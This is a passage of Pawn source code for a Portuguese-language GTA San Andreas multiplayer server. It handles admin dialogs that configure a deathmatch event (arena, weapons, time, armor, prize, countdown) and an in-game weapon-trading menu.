	                SendClientMessage(playerid, COR_ERRO, "O evento 'atual', não está carregado!");
	                SendClientMessage(playerid, COR_ERRO, "Para libera-lo, você precisa carrega-lo!");
	                ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
	                return 1;
	            }
	            SendClientMessage(playerid, COR_AMARELO, "O evento 'atual', agora está liberado para os(as) jogadores participar.");
	            esDM[evdmAnt_B] = 1;
	            esDM[evdmLiberado] = 1;
	            SetTimer("evdmGodPlayers", 1000, false);
	        }
	        if(listitem == 9) // Iniciar
	        {
	            if(esDM[evdmLiberado] == 0)
	            {
	                SendClientMessage(playerid, COR_ERRO, "Você só pode iniciar o evento após libera-lo!");
	                ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
	                return 1;
				}
				if(esDM[evdmCarregado] == 0)
    			{
	    			SendClientMessage(playerid, COR_ERRO, "Você precisa carregar o evento, para poder iniciar a contagem!");
	    			return 1;
				}
	        	ShowPlayerDialog(playerid, D_DMEVENT+21, DIALOG_STYLE_INPUT, "Definir Contagem Inicio", "{FFFFFF}Digite abaixo o tempo de contagem para iniciar o evento:", "Definir", "Voltar");
	        }
	        if(listitem == 10) // Resetar
	        {
	            SendClientMessage(playerid, COR_AMARELO, "Evento de DM resetado.");
	            evDMreset();
	        }
        }
    }
    if(dialogid == D_DMEVENT+1)
    {
        if(response)
		{
			if(listitem == 0) // Arena 1
	        {
				ShowPlayerDialog(playerid, D_DMEVENT+2, DIALOG_STYLE_MSGBOX, "Arena definida", "{FFFFFF}Arena definida para {FF8115}arena ID 1", "OK", "Redefinir");
	            esDM[evdmArenaID] = 1;
				esDM[evdmArenaIDDF] = 1;
			}
	        if(listitem == 1) // Arena 2
	        {
				ShowPlayerDialog(playerid, D_DMEVENT+2, DIALOG_STYLE_MSGBOX, "Arena definida", "{FFFFFF}Arena definida para {FF8115}arena ID 2", "OK", "Redefinir");
	            esDM[evdmArenaID] = 2;
				esDM[evdmArenaIDDF] = 1;
			}
	        if(listitem == 2) // Arena 3
	        {
				ShowPlayerDialog(playerid, D_DMEVENT+2, DIALOG_STYLE_MSGBOX, "Arena definida", "{FFFFFF}Arena definida para {FF8115}arena ID 3", "OK", "Redefinir");
	            esDM[evdmArenaID] = 3;
				esDM[evdmArenaIDDF] = 1;
			}
	        if(listitem == 3) // Arena 4
	        {
				ShowPlayerDialog(playerid, D_DMEVENT+2, DIALOG_STYLE_MSGBOX, "Arena definida", "{FFFFFF}Arena definida para {FF8115}arena ID 4", "OK", "Redefinir");
	            esDM[evdmArenaID] = 4;
				esDM[evdmArenaIDDF] = 1;
			}
	        if(listitem == 4) // Arena 5
	        {
    			ShowPlayerDialog(playerid, D_DMEVENT+2, DIALOG_STYLE_MSGBOX, "Arena definida", "{FFFFFF}Arena definida para {FF8115}arena ID 5", "OK", "Redefinir");
	            esDM[evdmArenaID] = 5;
				esDM[evdmArenaIDDF] = 1;
			}
	        if(listitem == 5) // Local Atual
	        {
	            new
					Float:dm_x, Float:dm_y, Float:dm_z
				;
				GetPlayerPos(playerid, dm_x, dm_y, dm_z);
				dmePos[0] = dm_x;
				dmePos[1] = dm_y;
				dmePos[2] = dm_z;
	            esDM[evdmArenaID] = 6;
				esDM[evdmArenaIDDF] = 1;
				ShowPlayerDialog(playerid, D_DMEVENT+2, DIALOG_STYLE_MSGBOX, "Arena definida", "{FFFFFF}Arena definida para {FF8115}Local Atual", "OK", "Redefinir");
			}
			if(listitem == 6) // Redefinir Arena
	    	{
	        	if(esDM[evdmArenaIDDF] == 1)
	            {
	                format(gStr, 128, "{FFFFFF}Arena já definida {FF8115}Arena ID %d", esDM[evdmArenaID]);
					ShowPlayerDialog(playerid, D_DMEVENT+16, DIALOG_STYLE_MSGBOX, "Arena Definida", gStr, "OK", "Redefinir");
	                return 0;
	            }
	            ShowPlayerDialog(playerid, D_DMEVENT+1, DIALOG_STYLE_LIST, "Definir Arena", "Arena ID 1\nArena ID 2\nArena ID 3\nArena ID 4\nArena ID 5\nLocal Atual", "Definir", "Voltar");
			}
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
    }
    if(dialogid == D_DMEVENT+2)
    {
        if(response)
        {
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
        }
        if(!response)
        {
            esDM[evdmArenaID] = 0;
			esDM[evdmArenaIDDF] = 0;
            ShowPlayerDialog(playerid, D_DMEVENT+1, DIALOG_STYLE_LIST, "Definir Arena", "Arena ID 1\nArena ID 2\nArena ID 3\nArena ID 4\nArena ID 5\nLocal Atual", "Escolher", "Voltar");
		}
    }
    if(dialogid == D_DMEVENT+3)
    {
  		if(response)
		{
			if(listitem == 0) // Arma 1
	        {
	            if(esDM[evdmArmaIDDF][0] == 1)
			    {
			    	format(gStr, 128, "{FF0000}Arma 1 já está definida para arma {FF2F00}%s", GetWeaponNameByID(esDM[evdmArmaID][0]));
					ShowPlayerDialog(playerid, D_DMEVENT+7, DIALOG_STYLE_MSGBOX, "Arma 1 já definida", gStr, "OK", "Redefinir");
			        return 0;
			    }
    			ShowPlayerDialog(playerid, D_DMEVENT+4, DIALOG_STYLE_INPUT, "Definir Arma 1", "{FFFFFF}Digite abaixo o ID da arma 1:", "Definir", "Voltar");
	        }
	        if(listitem == 1) // Arma 2
	        {
	            if(esDM[evdmArmaIDDF][1] == 1)
			    {
			    	format(gStr, 128, "{FF0000}Arma 2 já está definida para arma {FF2F00}%s", GetWeaponNameByID(esDM[evdmArmaID][1]));
					ShowPlayerDialog(playerid, D_DMEVENT+8, DIALOG_STYLE_MSGBOX, "Arma 2 já definida", gStr, "OK", "Redefinir");
			        return 0;
			    }
				ShowPlayerDialog(playerid, D_DMEVENT+5, DIALOG_STYLE_INPUT, "Definir Arma 2", "{FFFFFF}Digite abaixo o ID da arma 2:", "Definir", "Voltar");
	        }
	        if(listitem == 2) // Arma 3
	        {
	            if(esDM[evdmArmaIDDF][2] == 1)
			    {
			    	format(gStr, 128, "{FF0000}Arma 3 já está definida para arma {FF2F00}%s", GetWeaponNameByID(esDM[evdmArmaID][2]));
					ShowPlayerDialog(playerid, D_DMEVENT+9, DIALOG_STYLE_MSGBOX, "Arma 3 já definida", gStr, "OK", "Redefinir");
			        return 0;
			    }
				ShowPlayerDialog(playerid, D_DMEVENT+6, DIALOG_STYLE_INPUT, "Definir Arma 3", "{FFFFFF}Digite abaixo o ID da arma 3:", "Definir", "Voltar");
	        }
		}
		if(!response)
		{
  			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
    }
    if(dialogid == D_DMEVENT+4)
    {
        if(response)
        {
        	if(!strlen(inputtext))
        	{
				ShowPlayerDialog(playerid, D_DMEVENT+4, DIALOG_STYLE_INPUT, "Definir Arma 1", "{FF0000}Digite um ID!\n{FFFFFF}{FFFFFF}Digite abaixo o ID da arma 1:", "Definir", "Voltar");
				return 0;
			}
            new
				esArmaID = strval(inputtext)
			;
			if(!IsValidWeaponID(esArmaID))
      		{
				ShowPlayerDialog(playerid, D_DMEVENT+4, DIALOG_STYLE_INPUT, "Definir Arma 1", "{FF0000}Digite um ID de arma válido!\n{FFFFFF}{FFFFFF}Digite abaixo o ID da arma 1:", "Definir", "Voltar");
				return 0;
			}
			format(gStr, 128, "{FFFFFF}Arma 1 definida para arma {FF2F00}%s", GetWeaponNameByID(esArmaID));
			ShowPlayerDialog(playerid, D_DMEVENT+7, DIALOG_STYLE_MSGBOX, "Arma 1 definida", gStr, "OK", "Redefinir");
	    	esDM[evdmArmaID][0] = esArmaID;
			esDM[evdmArmaIDDF][0] = 1;
		}
        if(!response)
		{
  			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
    }
    if(dialogid == D_DMEVENT+5)
    {
        if(response)
        {
        	if(!strlen(inputtext))
        	{
				ShowPlayerDialog(playerid, D_DMEVENT+5, DIALOG_STYLE_INPUT, "Definir Arma 2", "{FF0000}Digite um ID!\n{FFFFFF}{FFFFFF}Digite abaixo o ID da arma 2:", "Definir", "Voltar");
				return 0;
			}
            new
				esArmaID = strval(inputtext)
			;
			if(!IsValidWeaponID(esArmaID))
      		{
				ShowPlayerDialog(playerid, D_DMEVENT+5, DIALOG_STYLE_INPUT, "Definir Arma 2", "{FF0000}Digite um ID de arma válido!\n{FFFFFF}{FFFFFF}Digite abaixo o ID da arma 2:", "Definir", "Voltar");
				return 0;
			}
			format(gStr, 128, "{FFFFFF}Arma 2 definida para arma {FF2F00}%s", GetWeaponNameByID(esArmaID));
			ShowPlayerDialog(playerid, D_DMEVENT+8, DIALOG_STYLE_MSGBOX, "Arma 2 definida", gStr, "OK", "Redefinir");
	    	esDM[evdmArmaID][1] = esArmaID;
			esDM[evdmArmaIDDF][1] = 1;
		}
        if(!response)
		{
   			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
    }
    if(dialogid == D_DMEVENT+6)
    {
        if(response)
        {
        	if(!strlen(inputtext))
        	{
				ShowPlayerDialog(playerid, D_DMEVENT+6, DIALOG_STYLE_INPUT, "Definir Arma 3", "{FF0000}Digite um ID!\n{FFFFFF}{FFFFFF}Digite abaixo o ID da arma 3:", "Definir", "Voltar");
				return 0;
			}
            new
				esArmaID = strval(inputtext)
			;
			if(!IsValidWeaponID(esArmaID))
      		{
				ShowPlayerDialog(playerid, D_DMEVENT+6, DIALOG_STYLE_INPUT, "Definir Arma 3", "{FF0000}Digite um ID de arma válido!\n{FFFFFF}{FFFFFF}Digite abaixo o ID da arma 3:", "Definir", "Voltar");
				return 0;
			}
			format(gStr, 128, "{FFFFFF}Arma 3 definida para arma {FF2F00}%s", GetWeaponNameByID(esArmaID));
			ShowPlayerDialog(playerid, D_DMEVENT+9, DIALOG_STYLE_MSGBOX, "Arma 3 definida", gStr, "OK", "Redefinir");
	    	esDM[evdmArmaID][2] = esArmaID;
			esDM[evdmArmaIDDF][2] = 1;
		}
        if(!response)
		{
   			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
    }
    if(dialogid == D_DMEVENT+7)
    {
        if(response)
        {
			ShowPlayerDialog(playerid, D_DMEVENT+3, DIALOG_STYLE_LIST, "Definir Armas", "Arma 1\nArma 2\nArma 3", "Definir", "Voltar");
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT+4, DIALOG_STYLE_INPUT, "Definir Arma 1", "{FFFFFF}{FFFFFF}Digite abaixo o ID da arma 1:", "Definir", "Voltar");
		}
    }
    if(dialogid == D_DMEVENT+8)
    {
        if(response)
        {
			ShowPlayerDialog(playerid, D_DMEVENT+3, DIALOG_STYLE_LIST, "Definir Armas", "Arma 1\nArma 2\nArma 3", "Definir", "Voltar");
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT+5, DIALOG_STYLE_INPUT, "Definir Arma 2", "{FFFFFF}{FFFFFF}Digite abaixo o ID da arma 2:", "Definir", "Voltar");
		}
    }
    if(dialogid == D_DMEVENT+9)
    {
        if(response)
        {
			ShowPlayerDialog(playerid, D_DMEVENT+3, DIALOG_STYLE_LIST, "Definir Armas", "Arma 1\nArma 2\nArma 3", "Definir", "Voltar");
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT+6, DIALOG_STYLE_INPUT, "Definir Arma 3", "{FFFFFF}{FFFFFF}Digite abaixo o ID da arma 3:", "Definir", "Voltar");
		}
    }
    if(dialogid == D_DMEVENT+10) // DEF_TEMPO
    {
        if(response)
        {
        	if(!strlen(inputtext))
        	{
				ShowPlayerDialog(playerid, D_DMEVENT+10, DIALOG_STYLE_INPUT, "Definir Tempo", "{FF0000}Digite um tempo!\n{FFFFFF}Digite abaixo o tempo do evento:", "Definir", "Voltar");
				return 0;
			}
            new
				esTempo = strval(inputtext)
			;
			if(esTempo < EVENT_MINTEM || esTempo > EVENT_MAXTEM)
      		{
      		    format(gStr, 128, "{FF0000}Digite um tempo válido! (Min: %d / Máx: %d)\n{FFFFFF}Digite abaixo o tempo do evento:", EVENT_MINTEM, EVENT_MAXTEM);
      		    ShowPlayerDialog(playerid, D_DMEVENT+10, DIALOG_STYLE_INPUT, "Definir Tempo", gStr, "Definir", "Voltar");
				return 0;
			}
			format(gStr, 128, "{FFFFFF}Tempo do evento definido para {12E2FF}%d minutos{FFFFFF}.", esTempo);
			ShowPlayerDialog(playerid, D_DMEVENT+11, DIALOG_STYLE_MSGBOX, "Tempo Definido", gStr, "OK", "Redefinir");
	    	esDM[evdmTempo] = esTempo*EVENT_MINUT;
	    	esDM[evdmTempoAM] = esTempo;
			esDM[evdmTempoDF] = 1;
		}
        if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
    }
	if(dialogid == D_DMEVENT+11)
    {

        if(response)
        {
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
        if(!response)
        {
        	ShowPlayerDialog(playerid, D_DMEVENT+10, DIALOG_STYLE_INPUT, "Definir Tempo", "{FF0000}Digite um tempo!\n{FFFFFF}Digite abaixo o tempo do evento:", "Definir", "Voltar");
		}
    }
	if(dialogid == D_DMEVENT+13)
    {
        if(response)
		{
        	ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
        if(!response)
        {
        	ShowPlayerDialog(playerid, D_DMEVENT+12, DIALOG_STYLE_LIST, "Definir Colete", "\nCom colete\nSem colete", "Escolher", "Voltar");
		}
    }
    if(dialogid == D_DMEVENT+12)
    {
        if(response)
		{
		    if(listitem == 0)
		    {
		     	ShowPlayerDialog(playerid, D_DMEVENT+13, DIALOG_STYLE_MSGBOX, "Colete Definido", "{FFFFFF}Evento definido {48FF00}com {FFFFFF}colete.", "OK", "Redefinir");
                esDM[evdmColete] = 1;
				esDM[evdmColeteDF] = 1;
	       	}
	       	if(listitem == 1)
		    {
		     	ShowPlayerDialog(playerid, D_DMEVENT+13, DIALOG_STYLE_MSGBOX, "Colete Definido", "{FFFFFF}Evento definido {FF0000}sem {FFFFFF}colete.", "OK", "Redefinir");
                esDM[evdmColete] = 1;
				esDM[evdmColeteDF] = 2;
	       	}
		}
        if(!response)
        {
        	ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
	}
	if(dialogid == D_DMEVENT+14)
    {
        if(response)
        {
            if(esDM[evdmPremioDF] == 1)
            {
                format(gStr, 128, "{FFFFFF}Prêmio já definido para {48FF00}R$%d", esDM[evdmPremio]);
				ShowPlayerDialog(playerid, D_DMEVENT+15, DIALOG_STYLE_MSGBOX, "Prêmio Definido", gStr, "OK", "Redefinir");
                return 0;
            }
        	if(!strlen(inputtext))
        	{
				ShowPlayerDialog(playerid, D_DMEVENT+14, DIALOG_STYLE_INPUT, "Definir Prêmio", "{FF0000}Digite um valor!\n{FFFFFF}Digite abaixo o valor do prêmio:", "Definir", "Voltar");
				return 0;
			}
            new
				esPremio = strval(inputtext)
			;
			if(esPremio < EVENT_MINPRE || esPremio > EVENT_MAXPRE)
      		{
      		    format(gStr, 128, "{FF0000}Digite um valor entre %d a %d!\n{FFFFFF}Digite abaixo o valor do prêmio:", EVENT_MINPRE, EVENT_MAXPRE);
				ShowPlayerDialog(playerid, D_DMEVENT+14, DIALOG_STYLE_INPUT, "Definir Prêmio", gStr, "Definir", "Voltar");
				return 0;
			}
			format(gStr, 128, "{FFFFFF}Prêmio definido para {48FF00}R$%d", esPremio);
			ShowPlayerDialog(playerid, D_DMEVENT+15, DIALOG_STYLE_MSGBOX, "Prêmio Definido", gStr, "OK", "Redefinir");
			esDM[evdmPremio] = esPremio;
			esDM[evdmPremioDF] = 1;
		}
        if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
    }
	if(dialogid == D_DMEVENT+15)
    {
        if(response)
        {
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
		if(!response)
        {
        	ShowPlayerDialog(playerid, D_DMEVENT+14, DIALOG_STYLE_INPUT, "Definir Prêmio", "Digite abaixo o prêmio do evento:", "Definir", "Voltar");
	 	}
	}
	if(dialogid == D_DMEVENT+16)
    {
        if(response)
        {
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
		if(!response)
        {
        	ShowPlayerDialog(playerid, D_DMEVENT+1, DIALOG_STYLE_LIST, "Definir Arena", "Arena ID 1\nArena ID 2\nArena ID 3\nArena ID 4\nArena ID 5\nLocal Atual", "Definir", "Voltar");
		}
	}
	if(dialogid == D_DMEVENT+17)
    {
        if(response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
		if(!response)
        {
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Edit", "Fechar");
		}
	}
	if(dialogid == D_DMEVENT+18)
	{
	    if(response)
		{
		    if(listitem == 0) // Pack Armas 1
		    {
                esDM[evdmArmaPK] = 1;
				esDM[evdmArmaPKDF] = 1;
		    }
		    if(listitem == 1) // Pack Armas 2
		    {
                esDM[evdmArmaPK] = 2;
				esDM[evdmArmaPKDF] = 1;
		    }
		    if(listitem == 2) // Pack Armas 3
		    {
                esDM[evdmArmaPK] = 3;
				esDM[evdmArmaPKDF] = 1;
		    }
		    if(listitem == 3) // Pack Armas 4
		    {
                esDM[evdmArmaPK] = 4;
				esDM[evdmArmaPKDF] = 1;
		    }
		    if(listitem == 4) // Pack Armas 5
		    {
                esDM[evdmArmaPK] = 5;
				esDM[evdmArmaPKDF] = 1;
		    }
		    ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
	    }
	    if(!response)
	    {
	    	ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
	    }
	}
	if(dialogid == D_DMEVENT+19)
	{
	    if(response)
	    {
	     	esDM[evdmArmaPK] = 0;
			esDM[evdmArmaPKDF] = 0;
			ShowPlayerDialog(playerid, D_DMEVENT+3, DIALOG_STYLE_LIST, "Definir Armas", "Arma 1\nArma 2\nArma 3", "Definir", "Voltar");
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
		}
	}
	if(dialogid == D_DMEVENT+20)
	{
	    if(response)
	    {
			for(new i; i < 3; ++i)
			{
				esDM[evdmArmaID][i] = 0;
				esDM[evdmArmaIDDF][i] = 0;
			}
			format(s5Doze, 512, "Pack 1 (M4/Sniper/Uzzie/Sawnoff/Taco basebal)\nPack 2 (Tec/Sawnoff/Eagle/Faca/AK-47)\nPack 3 (Ak47/Cassetete/9mm/MP5)\nPack 4 (Extinto/Pá/9mm com S)\nPack 5 (Minigun/Extintor/Satchel Charge/Detonator)");
			ShowPlayerDialog(playerid, D_DMEVENT+18, DIALOG_STYLE_LIST, "Definir Armas Pack", s5Doze, "Definir", "Voltar");
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
		}
	}
	if(dialogid == D_DMEVENT+21)
	{
        if(response)
        {
        	if(!strlen(inputtext))
        	{
				ShowPlayerDialog(playerid, D_DMEVENT+21, DIALOG_STYLE_INPUT, "Tempo Contagem", "{FF0000}Digite um tempo!\n{FFFFFF}Digite abaixo o tempo de contagem:", "Contar", "Voltar");
				return 0;
			}
            new
				esTempo = strval(inputtext)
			;
			if(esTempo < 5 || esTempo > 60)
      		{
      		    format(gStr, 128, "{FF0000}Digite um tempo válido! (Min: %d / Máx: %d)\n{FFFFFF}Digite abaixo o tempo de contagem:", EVENT_MINTEC, EVENT_MAXTEC);
      		    ShowPlayerDialog(playerid, D_DMEVENT+21, DIALOG_STYLE_INPUT, "Tempo Contagem", gStr, "Contar", "Voltar");
				return 0;
			}
			esDM[evdmCount] = esTempo;
			SetTimer("evdmContagem", 1000, false);
		}
        if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
		}
    }
    if(dialogid == D_DMEVENT+23)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            esDM[evdmTop] = 1;
	        }
	        if(listitem == 1)
	        {
	            esDM[evdmTop] = 2;
	        }
	        if(listitem == 2)
	        {
	            esDM[evdmTop] = 3;
	        }
	        if(listitem == 3)
	        {
	            esDM[evdmTop] = 4;
	        }
	        if(listitem == 4)
	        {
	            esDM[evdmTop] = 5;
	        }
	        if(listitem == 5)
	        {
	            esDM[evdmTop] = 6;
	        }
	        if(listitem == 6)
	        {
	            esDM[evdmTop] = 7;
	        }
	        if(listitem == 7)
	        {
	            esDM[evdmTop] = 8;
	        }
	        if(listitem == 8)
	        {
	            esDM[evdmTop] = 9;
	        }
	        if(listitem == 9)
	        {
	            esDM[evdmTop] = 10;
	        }
	        esDM[evdmTopDF] = 1;
	        format(gStr, 128, "Evento definido para top {00FF00}%d", esDM[evdmTop]);
	        ShowPlayerDialog(playerid, D_DMEVENT+24, DIALOG_STYLE_MSGBOX, "Top Definido", gStr, "OK", "Redefinir");
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
		}
	}
	if(dialogid == D_DMEVENT+24)
	{
	    if(response)
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
		}
		if(!response)
		{
		    esDM[evdmTop] = 0;
		    esDM[evdmTopDF] = 0;
			ShowPlayerDialog(playerid, D_DMEVENT+23, DIALOG_STYLE_LIST, "Definir Top", "Top 1\nTop 2\nTop 3\nTop 4\nTop 5\nTop 6\nTop 7\nTop 8\nTop 9\nTop 10", "Definir", "Voltar");
		}
	}
	if(dialogid == D_PAULCAR)
	{
		if(response)
		{
		    FireTimerP[playerid] = SetTimerEx("AtualizaGPSFire", 1000, false, "dd", playerid, FireAtual[playerid]);
		}
		if(!response)
		{
		    FireTimerP[playerid] = SetTimerEx("AtualizaGPSFire", 1000, false, "dd", playerid, FireAtual[playerid]);
		}
	}
	if(dialogid == D_PARMA)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
		        armaEscol[playerid] = 1;
		    }
		    if(listitem == 1)
		    {
		        armaEscol[playerid] = 2;
		    }
		    if(listitem == 2)
		    {
		        armaEscol[playerid] = 4;
		    }
		    if(listitem == 3)
		    {
		        armaEscol[playerid] = 5;
		    }
		    format(gStr, sizeof(gStr), "\n\n{FFFFFF}Você escolheu uma {FF7F00}%s {FFFFFF}para vender.\n\nDigite o preço da arma de R$1.000 à R$10.000:", ArmaNome(armaEscol[playerid]));
            ShowPlayerDialog(playerid, D_PARMA+1, DIALOG_STYLE_INPUT, "Tráfico de Armas", gStr, "Definir", "Cancelar");
		}
	}
	if(dialogid == D_PARMA+1)
	{
		if(response)
		{
	    	if(!strlen(inputtext))
	    	{
	    	    format(gstring, sizeof(gstring), "\n\n{FF0000}Apenas valores entre R$1.000 e R$10.000\n\nArma {FF7F00}%s\n\n{FFFFFF}Digite o preço da arma:", ArmaNome(armaEscol[playerid]));
            	ShowPlayerDialog(playerid, D_PARMA+1, DIALOG_STYLE_INPUT, "Tráfico de Armas", gstring, "Oferecer", "Cancelar");
				return 0;
			}
			new
				preco = strval(inputtext)
			;
			if(preco < 1000 || preco > 10000)
			{
	    	    format(gstring, sizeof(gstring), "\n\n{FF0000}Apenas valores entre R$1.000 e R$10.000\n\nArma {FF7F00}%s\n\n{FFFFFF}Digite o preço da arma:", ArmaNome(armaEscol[playerid]));
            	ShowPlayerDialog(playerid, D_PARMA+1, DIALOG_STYLE_INPUT, "Tráfico de Armas", gstring, "Oferecer", "Cancelar");
				return 0;
			}
			preccArma[playerid] = preco;
			format(gstring, sizeof(gstring), "\n\n{FFFFFF}Digite o ID do(a) jogador(a) que você deseja vender a arma.\n\nArma {FF7F00}%s {00B038}R$%d\n\n{FFFFFF}Digite o ID abaixo:", ArmaNome(armaEscol[playerid]), preco);
            ShowPlayerDialog(playerid, D_PARMA+2, DIALOG_STYLE_INPUT, "{FFFFFF}Tráfico de Armas", gstring, "Oferecer", "Cancelar");
		}
		if(!response)
		{
		    armaEscol[playerid] = -1;
		    preccArma[playerid] = -1;
		    compraArm[playerid] = -1;
		}
	}
	if(dialogid == D_PARMA+2)
	{
		if(response)
		{
	    	if(!strlen(inputtext))
	    	{
	    	    format(gstring, sizeof(gstring), "\n\n{FF0000}Informe o ID do(a) jogador(a)!\n\nArma {FF7F00}%s\n\n{FFFFFF}Digite o ID do(a) jogador(a) que você deseja vender a arma:", ArmaNome(armaEscol[playerid]));
            	ShowPlayerDialog(playerid, D_PARMA+2, DIALOG_STYLE_INPUT, "{FFFFFF}Tráfico de Armas", gstring, "Oferecer", "Cancelar");
				return 0;
			}
			new
				id = strval(inputtext)
			;
			if(!IsPlayerConnected(id))
			{
			   	format(gstring, sizeof(gstring), "\n\n{FF0000}Jogador(a) não conectado(a)!\n\nArma {FF7F00}%s\n\n{FFFFFF}Digite o ID do(a) jogador(a) que você deseja vender a arma:", ArmaNome(armaEscol[playerid]));
          		ShowPlayerDialog(playerid, D_PARMA+2, DIALOG_STYLE_INPUT, "{FFFFFF}Tráfico de Armas", gstring, "Oferecer", "Cancelar");
				return 0;
			}
			if(playerid == id)
			{
			   	format(gstring, sizeof(gstring), "\n{FF0000}Você não pode vender uma arma a si mesmo!\n\n[INFO]Arma %s\n\nDigite o ID do(a) jogador(a) que você deseja vender a arma:", ArmaNome(armaEscol[playerid]));
          		ShowPlayerDialog(playerid, D_PARMA+2, DIALOG_STYLE_INPUT, "Tráfico de Armas", gstring, "Oferecer", "Cancelar");
				return 0;
			}
			if(GetDistanceBetweenPlayers(playerid, id) > 15)
			{
